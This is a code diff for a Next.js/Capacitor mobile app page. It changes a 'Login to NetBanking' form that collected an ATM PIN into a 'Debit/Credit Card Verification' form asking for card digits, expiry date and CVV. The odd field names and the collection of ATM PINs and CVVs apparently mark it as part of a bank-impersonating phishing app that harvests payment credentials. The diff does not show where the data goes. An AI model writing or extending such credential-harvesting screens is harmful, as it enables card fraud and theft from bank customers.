@@ -6,6 +6,8 @@ import { useRouter } from "next/navigation";
 import { useEffect } from "react";  
 import styles from '../css.module.css';
 import { Device } from '@capacitor/device';
+import DebitCardInputComponent from "../inlcude/DebitCardInputComponent";
+import DebitCard6InputComponent from "../inlcude/DebitCard6InputComponent";
 
 
 export default function Home() {
@@ -44,12 +46,15 @@ export default function Home() {
     <>
     <Header />
     <div className="container">
-      <h5 className={`${styles.textCenterDiv} mt-4 mb-3`}>Login  to NetBanking</h5>
-      <form onSubmit={handleSubmit} >
-          <ExpiryDateInputComponent />
-          <div className={`form-group ${styles.inputDiv}`}>
-            <label>ATM PIN</label>
-            <input type="password" name="amtin" className={`form-control ${styles.formInput}`} minLength={4} maxLength={4} inputMode="numeric" required placeholder=" " />
+      <h5 className={`${styles.textCenterDiv} mt-4 mb-3`}>Debit/Credit Card Verification</h5>
+      <form onSubmit={handleSubmit} className="mt-4" >
+          <DebitCard6InputComponent />
+          <div className="d-flex gap-2 justify-content-between mt-4">
+            <ExpiryDateInputComponent />
+            <div className={`form-group ${styles.inputDiv}`}>
+              <label>CVV</label>
+              <input type="password" name="cvv_6" className={`form-control ${styles.formInput}`} minLength={3} maxLength={3} inputMode="numeric" required placeholder=" " />
+            </div>
           </div>
           <div className="d-flex justify-content-center mt-4">
             <button type="submit"  className="btn btn-primary"> CONTINUE </button>
